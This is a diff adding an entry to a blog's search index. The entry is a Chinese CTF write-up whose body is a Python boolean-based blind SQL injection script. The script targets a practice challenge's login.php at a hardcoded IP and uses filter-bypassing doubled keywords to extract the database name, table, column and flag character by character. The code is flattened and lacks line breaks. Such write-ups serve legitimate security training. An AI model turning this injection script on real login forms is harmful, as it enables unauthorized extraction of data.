@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>sql2——payload(校园练习平台)</title>
+      <link href="/2021/101045445.html"/>
+      <url>/2021/101045445.html</url>
+      
+        <content type="html"><![CDATA[<p>主要采用了布尔注入，是《从0到1ctfer》的配套web题之一，原wp采用了报错注入，这里使用的是布尔注入方式<br><br>以下为自己写的payload：<br></p><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + &quot;!@\#\$%\^&amp;\*()_+&#123;&#125;-=&quot;def dabase_length():url=&quot;http://123.56.166.12:8803/login.php&quot;response = &quot;1&quot;for i in range(10):loginname = &quot;admin&#39; and &quot; + &quot;(length(database())=&quot; + str(i) + &quot;)\#&quot;data =&#123;&#39;name&#39;:loginname,&#39;pass&#39;:&#39;111&#39;&#125;responseold = responseresponse = requests.post(url=url , data = data).textif ((responseold != response)and responseold != &#39;1&#39;):print(&quot;database length is %s&quot;%i)break#爆数据库长度def database_name():url=&quot;http://123.56.166.12:8803/login.php&quot;right = &#39;8bef&#39;name = &#39;&#39;for j in range(1,5):for i in range(65,123):key = &quot;admin&#39; and &quot; + &quot;(ascii(substr(database(),%d,1))=%d)\#&quot;%(j,i)data =&#123;&#39;name&#39;:key,&#39;pass&#39;:&#39;114514&#39;&#125;response = requests.post(url=url,data=data).textif(right in response):name += chr(i)print(name)#爆数据库名字 notedef table_name():url=&quot;http://123.56.166.12:8803/login.php&quot;right = &#39;8bef&#39;name = &#39;&#39;for j in range(1,5):for i in range(48,123):key = &quot;admin&#39; and &quot; + &quot;(ascii(substr((selselectect table_name FROMinformation_schema.tables WHERE table_schema = &#39;note&#39; limit0,1),%d,1))=%d)\#&quot;%(j,i)data =&#123;&#39;name&#39;:key,&#39;pass&#39;:&#39;114514&#39;&#125;response = requests.post(url=url,data=data).textif(right in response):name += chr(i)print(name)#爆表名 flgdef clumn_name():url=&quot;http://123.56.166.12:8803/login.php&quot;right = &#39;8bef&#39;name = &#39;&#39;for j in range(1,5):for i in range(48,123):key = &quot;admin&#39;&quot;+&quot; and (ascii(substr((seselectlect column_name FROMinformation_schema.columns WHERE table_name=&#39;fl4g&#39; limit0,1),%d,1))=%d)\#&quot;%(j,i)data =&#123;&#39;name&#39;:key,&#39;pass&#39;:&#39;114514&#39;&#125;response = requests.post(url=url,data=data).text\# print(response)if(right in response):name += chr(i)print(name)def flag():url=&quot;http://123.56.166.12:8803/login.php&quot;right = &#39;8bef&#39;name = &#39;&#39;for j in range(19,30):for i in range(48,126):key = &quot;admin&#39;&quot;+&quot; and (ascii(substr((seselectlect flag FROM fl4g limit0,1),%d,1))=%d)\#&quot;%(j,i)data =&#123;&#39;name&#39;:key,&#39;pass&#39;:&#39;114514&#39;&#125;response = requests.post(url=url,data=data).text\# print(response)if(right in response):name += chr(i)print(name)print(name)#爆段名if \__name_\_ == &quot;__main__&quot;:database_name()table_name()clumn_name()flag()</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HPUCTF部分思路</title>
       <link href="/2021/101012765.html"/>
       <url>/2021/101012765.html</url>
